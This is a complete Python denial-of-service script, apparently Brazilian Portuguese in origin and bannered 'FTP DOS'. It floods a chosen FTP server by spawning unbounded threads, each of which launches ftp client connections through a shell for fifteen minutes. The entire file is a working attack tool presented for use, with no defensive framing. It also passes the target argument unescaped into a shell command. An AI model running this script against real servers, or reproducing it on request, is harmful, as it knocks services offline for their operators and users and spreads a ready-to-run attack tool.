import socket
import sys
import threading
import subprocess
import time


def banner():
        print("""███████╗████████╗██████╗     ██████╗  ██████╗ ███████╗
██╔════╝╚══██╔══╝██╔══██╗    ██╔══██╗██╔═══██╗██╔════╝
█████╗     ██║   ██████╔╝    ██║  ██║██║   ██║███████╗
██╔══╝     ██║   ██╔═══╝     ██║  ██║██║   ██║╚════██║
██║        ██║   ██║         ██████╔╝╚██████╔╝███████║
╚═╝        ╚═╝   ╚═╝         ╚═════╝  ╚═════╝ ╚══════╝""")
banner()


uso = "{} <ALVO> <PORTA (PADRÃO: 21)> <MÁX_CONEXÕES (PADRÃO: 50)>".format(sys.argv[0])


def testar_conexao(alvo, porta):
    s = socket.socket()
    s.settimeout(10)
    try:
        s.connect((alvo, porta))
        resposta = s.recv(65535)
        s.close()
        return True
    except socket.error:
        print(f"Porta {porta} não está aberta. Por favor, especifique uma porta que esteja aberta.")
        sys.exit()


def ataque(alvo, porta, id_conexao):
    try:
        subprocess.Popen(f"ftp {alvo} {porta}", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    except OSError:
        pass


def iniciar_ataque_loop(alvo, porta, conexoes):
    threading.Thread(target=temporizador).start()
    while True:
        for i in range(1, conexoes + 1):
            t = threading.Thread(target=ataque, args=(alvo, porta, i))
            t.start()


def temporizador():
    tempo_inicio = time.time()
    while True:
        if time.time() - tempo_inicio > 900:  # 900 segundos = 15 minutos
            subprocess.Popen("pkill ftp", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            break
        time.sleep(1)


def main():
    print("\n=========== Iniciando Ataque FTP ===========\n")
    try:
        alvo = sys.argv[1]
    except IndexError:
        print("Erro: Alvo não especificado.\nModo de uso:")
        print(uso)
        sys.exit()

    try:
        porta = int(sys.argv[2])
    except (IndexError, ValueError):
        porta = 21  # Porta padrão FTP

    try:
        conexoes = int(sys.argv[3])
    except (IndexError, ValueError):
        conexoes = 50

    print(f"[!] Testando se {alvo}:{porta} está acessível...")
    if testar_conexao(alvo, porta):
        print(f"[+] Porta {porta} aberta. Iniciando ataque em {alvo}:{porta} com {conexoes} conexões simultâneas...")
        time.sleep(2)
        thread_ataque = threading.Thread(target=iniciar_ataque_loop, args=(alvo, porta, conexoes))
        thread_ataque.start()

if __name__ == "__main__":
    main()
